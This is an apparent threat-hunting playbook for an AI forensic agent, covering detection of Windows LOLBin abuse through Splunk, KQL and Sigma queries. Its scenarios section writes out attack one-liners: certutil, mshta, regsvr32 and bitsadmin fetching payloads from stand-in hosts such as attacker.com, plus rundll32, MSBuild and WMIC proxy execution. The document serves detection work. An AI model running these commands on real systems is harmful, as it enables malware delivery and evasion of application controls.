---
name: cb-hunting-for-lolbins-execution-in-endpoint-logs
skill_id: cb-hunting-for-lolbins-execution-in-endpoint-logs
journal_id: CB-SKL-237
description: Cold-box analyst playbook — Hunting For Lolbins Execution In Endpoint
  Logs. Hunt for adversary abuse of Living Off the Land Binaries (LOLBins) by analyzing
  endpoint process creation logs for suspicious execution patterns of legitimate Windows
  system binaries used for malicious purposes.
domain: cold-box
subdomain: threat-hunting
tier: adjacent
case_profiles:
- general
execution_mode: sift_runnable
artifact_platforms:
- any
host_platforms:
- linux
tags:
- threat-hunting
- lolbins
- living-off-the-land
- endpoint-detection
- process-monitoring
- mitre-t1218
- defense-evasion
cold_box_version: 2
inspired_by: hunting-for-lolbins-execution-in-endpoint-logs
---

# Hunting For Lolbins Execution In Endpoint Logs (cold-box)

> **Journal ID:** `CB-SKL-237` — cite this in every journal entry while following this playbook.

## Cold-box constraints (always)

- Evidence lives on the **sealed operation table** — read only through the viewport (`input_relpath`).
- **Never write** on `operation-table/`; tool output goes to `records/{case_id}/scratch/`.
- **Log this playbook** in the case journal with **`CB-SKL-237`** (`log_skill`) when you adopt it and at each major step.
- Every SIFT execution: `run_sift_tool` with **`purpose`**, **`why`**, and cite returned **`tool_id`** + **`audit_id`** in the journal.
- Prefer `list_sift_tools(verified_only=true)` — skip `[BAD — DO NOT USE]` tools.
- Load this playbook with `get_skill("cb-hunting-for-lolbins-execution-in-endpoint-logs")`; do not treat markdown code blocks as direct shell commands.

## Agent loop

1. `suggest_skills(case_profile=...)` or `get_skill("cb-hunting-for-lolbins-execution-in-endpoint-logs")` → note **`CB-SKL-237`**
2. `log_skill(case_id, journal_id="CB-SKL-237", action="adopted", note="...")`
3. `list_sift_tools(verified_only=true)` → pick tools from the map below
4. `describe_sift_tool(tool_id)` → `run_sift_tool(...)` → journal stdout with `CB-SKL-237` + `audit_id`
5. `log_skill(..., action="finding", note="...")` when recording conclusions; self-correct if outputs conflict


## When to use

- When hunting for fileless attack techniques that abuse built-in Windows binaries
- After threat intelligence indicates LOLBin-based campaigns targeting your industry
- When investigating alerts for suspicious use of certutil, mshta, rundll32, or regsvr32
- During purple team exercises testing detection of defense evasion techniques
- When assessing endpoint detection coverage for MITRE ATT&CK T1218 sub-techniques

## Tool map (SIFT via MCP)

**Execution mode:** `sift_runnable` — SIFT tools below are available on this host.

| binary | tool_id | verified | available |
|--------|---------|----------|-----------|
| `powershell` | `SIFT-179` | no | no |
| `regsvr32` | `SIFT-100` | no | yes |
| `sort` | `SIFT-020` | yes | yes |
| `wmic` | `SIFT-186` | no | no |
| `file` | `SIFT-008` | yes | yes |

## Cold-box MCP examples

Use these instead of running shell blocks directly. Always log `{journal_id}` in purpose/why or via `log_skill`.

### `powershell` → `SIFT-179`

```json
{
  "tool_id": "SIFT-179",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-237] powershell per playbook step",
  "why": "Executing cb-hunting-for-lolbins-execution-in-endpoint-logs \u2014 see Procedure section",
  "extra_args": []
}
```

### `regsvr32` → `SIFT-100`

```json
{
  "tool_id": "SIFT-100",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-237] regsvr32 per playbook step",
  "why": "Executing cb-hunting-for-lolbins-execution-in-endpoint-logs \u2014 see Procedure section",
  "extra_args": []
}
```

### `sort` → `SIFT-020`

```json
{
  "tool_id": "SIFT-020",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-237] sort per playbook step",
  "why": "Executing cb-hunting-for-lolbins-execution-in-endpoint-logs \u2014 see Procedure section",
  "extra_args": []
}
```

### `wmic` → `SIFT-186`

```json
{
  "tool_id": "SIFT-186",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-237] wmic per playbook step",
  "why": "Executing cb-hunting-for-lolbins-execution-in-endpoint-logs \u2014 see Procedure section",
  "extra_args": []
}
```

### `file` → `SIFT-008`

```json
{
  "tool_id": "SIFT-008",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-237] file per playbook step",
  "why": "Executing cb-hunting-for-lolbins-execution-in-endpoint-logs \u2014 see Procedure section",
  "extra_args": []
}
```

## Journal logging

When you adopt this playbook, append to `records/{case_id}/{case_id}.md`:

```markdown
## {timestamp} — skill `CB-SKL-237` (`cb-hunting-for-lolbins-execution-in-endpoint-logs`)

- **action:** adopted | step | finding | deferred | completed
- **note:** What you did or concluded under this playbook
- **related_audit_ids:** (optional) CB-… from run_sift_tool
```

Or call MCP: `log_skill(case_id, journal_id="{journal_id}", action="adopted", note="...")`

## Cold-box path translation

When the procedure below uses host paths, translate as follows:

| Procedure path | Cold-box equivalent |
|----------------|---------------------|
| `C:\Evidence\...` / `/cases/...` | `{input_relpath}` on the sealed table (via viewport) |
| `C:\Output\...` / `/analysis/...` | `records/{case_id}/scratch/` (tool stdout/files) |
| Live SIEM / cloud console steps | **Reference only** on cold-box — note capability gap in journal |

Do not copy evidence off the table except into `records/{case_id}/scratch/` via `run_sift_tool`.


## Procedure

## When to Use

- When hunting for fileless attack techniques that abuse built-in Windows binaries
- After threat intelligence indicates LOLBin-based campaigns targeting your industry
- When investigating alerts for suspicious use of certutil, mshta, rundll32, or regsvr32
- During purple team exercises testing detection of defense evasion techniques
- When assessing endpoint detection coverage for MITRE ATT&CK T1218 sub-techniques

## Prerequisites

- Sysmon Event ID 1 (Process Creation) with full command-line logging
- Windows Security Event ID 4688 with command-line auditing enabled
- EDR telemetry with parent-child process relationships
- SIEM platform for query and correlation (Splunk, Elastic, Microsoft Sentinel)
- LOLBAS project reference (lolbas-project.github.io) for known abuse patterns

## Workflow

1. **Build LOLBin Watchlist**: Compile a list of high-risk LOLBins from the LOLBAS project, prioritizing: certutil.exe, mshta.exe, rundll32.exe, regsvr32.exe, msbuild.exe, installutil.exe, cmstp.exe, wmic.exe, wscript.exe, cscript.exe, bitsadmin.exe, and powershell.exe.
2. **Baseline Normal Usage**: Establish what normal LOLBin usage looks like in your environment by profiling command-line arguments, parent processes, and user contexts for each binary over 30 days.
3. **Hunt for Anomalous Arguments**: Search for LOLBins executed with unusual command-line arguments indicating abuse -- certutil with `-urlcache -decode -encode`, mshta with URL arguments, rundll32 loading DLLs from temp/user directories, regsvr32 with `/s /n /u /i:URL`.
4. **Analyze Parent-Child Relationships**: Identify unexpected parent processes spawning LOLBins -- for example, outlook.exe spawning mshta.exe, or winword.exe spawning certutil.exe indicates weaponized document delivery.
5. **Check Execution from Unusual Paths**: LOLBins executed from non-standard paths (copies placed in %TEMP%, user profile directories) suggest renamed binary abuse.
6. **Correlate with Network Activity**: Map LOLBin execution to outbound network connections (Sysmon Event ID 3) to identify download cradles and C2 callbacks.
7. **Score and Prioritize**: Rank findings by anomaly severity, combining suspicious arguments, unusual parent process, non-standard path, and network activity indicators.

## Key Concepts

| Concept | Description |
|---------|-------------|
| T1218 | System Binary Proxy Execution |
| T1218.001 | Compiled HTML File (mshta.exe) |
| T1218.003 | CMSTP |
| T1218.005 | Mshta |
| T1218.010 | Regsvr32 (Squiblydoo) |
| T1218.011 | Rundll32 |
| T1127.001 | MSBuild |
| T1197 | BITS Jobs (bitsadmin.exe) |
| T1140 | Deobfuscate/Decode Files (certutil.exe) |
| T1059.001 | PowerShell |
| T1059.005 | Visual Basic (wscript/cscript) |
| LOLBAS | Living Off the Land Binaries, Scripts and Libraries project |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Sysmon | Process creation with command-line and hash logging |
| CrowdStrike Falcon | EDR with LOLBin detection analytics |
| Microsoft Defender for Endpoint | Built-in LOLBin abuse detection |
| Splunk | SPL-based process hunting and anomaly detection |
| Elastic Security | Pre-built LOLBin detection rules |
| LOLBAS Project | Reference database of LOLBin abuse techniques |
| Sigma Rules | Community detection rules for LOLBin abuse |

## Detection Queries

### Splunk -- High-Risk LOLBin Execution
```spl
index=sysmon EventCode=1
| where match(Image, "(?i)(certutil|mshta|rundll32|regsvr32|msbuild|installutil|cmstp|bitsadmin)\.exe$")
| eval suspicious=case(
    match(CommandLine, "(?i)certutil.*(-urlcache|-decode|-encode)"), "certutil_download_decode",
    match(CommandLine, "(?i)mshta.*(http|https|javascript|vbscript)"), "mshta_remote_exec",
    match(CommandLine, "(?i)rundll32.*\\\\(temp|appdata|users)"), "rundll32_unusual_dll",
    match(CommandLine, "(?i)regsvr32.*/s.*/n.*/u.*/i:"), "regsvr32_squiblydoo",
    match(CommandLine, "(?i)msbuild.*\\\\(temp|appdata|users)"), "msbuild_unusual_project",
    match(CommandLine, "(?i)bitsadmin.*/transfer"), "bitsadmin_download",
    match(CommandLine, "(?i)cmstp.*/s.*/ni"), "cmstp_uac_bypass",
    1=1, "normal"
)
| where suspicious!="normal"
| table _time Computer User Image CommandLine ParentImage ParentCommandLine suspicious
```

### KQL -- Microsoft Sentinel LOLBin Hunting
```kql
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("certutil.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe",
    "msbuild.exe", "installutil.exe", "cmstp.exe", "bitsadmin.exe")
| where ProcessCommandLine matches regex @"(?i)(urlcache|decode|encode|http://|https://|javascript:|vbscript:|/s\s+/n|/transfer)"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
    InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp desc
```

### Sigma Rule -- Suspicious LOLBin Command Line
```yaml
title: Suspicious LOLBin Execution with Malicious Arguments
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection_certutil:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - '-urlcache'
            - '-decode'
            - '-encode'
    selection_mshta:
        Image|endswith: '\mshta.exe'
        CommandLine|contains:
            - 'http://'
            - 'https://'
            - 'javascript:'
    selection_regsvr32:
        Image|endswith: '\regsvr32.exe'
        CommandLine|contains|all:
            - '/s'
            - '/i:'
    condition: 1 of selection_*
level: high
tags:
    - attack.defense_evasion
    - attack.t1218
```

## Common Scenarios

1. **Certutil Download Cradle**: `certutil.exe -urlcache -split -f http://malicious.com/payload.exe %TEMP%\payload.exe` used to download malware bypassing proxy filters.
2. **Mshta HTA Execution**: `mshta.exe http://attacker.com/malicious.hta` executing remote HTA files containing VBScript or JScript payloads.
3. **Regsvr32 Squiblydoo**: `regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll` executing remote SCT files to bypass application whitelisting.
4. **Rundll32 DLL Proxy**: `rundll32.exe C:\Users\user\AppData\Local\Temp\malicious.dll,EntryPoint` executing attacker DLLs via legitimate binary.
5. **MSBuild Inline Task**: `msbuild.exe C:\Temp\malicious.csproj` executing C# code embedded in project files to bypass application control.
6. **BITS Transfer**: `bitsadmin /transfer job /download /priority high http://attacker.com/malware.exe C:\Temp\update.exe` using BITS service for stealthy file download.
7. **WMIC XSL Execution**: `wmic process list /format:evil.xsl` executing JScript/VBScript from XSL stylesheets.

## Output Format

```
Hunt ID: TH-LOLBIN-[DATE]-[SEQ]
Host: [Hostname]
User: [Account context]
LOLBin: [Binary name]
Full Path: [Execution path]
Command Line: [Full arguments]
Parent Process: [Parent image and command line]
Detection Category: [download_cradle/proxy_exec/uac_bypass/applocker_bypass]
Network Activity: [Yes/No -- destination if applicable]
Risk Level: [Critical/High/Medium/Low]
```

## Self-correction

- If a SIFT tool errors, read `describe_sift_tool` and pick an alternate from the tool map.
- If procedure steps require SIEM/cloud/live APIs, log `{journal_id}` + `action=deferred` with the gap.
- Do not override `[BAD — DO NOT USE]` tools.
- Mark inference vs confirmed in journal; tie confirmed findings to `audit_id`.

## Limits

- Playbooks guide reasoning; **confirmed findings require tool output** in scratch with matching `audit_id`.
- Reference-mode steps are not executable on cold-box until equivalent SIFT tooling exists.
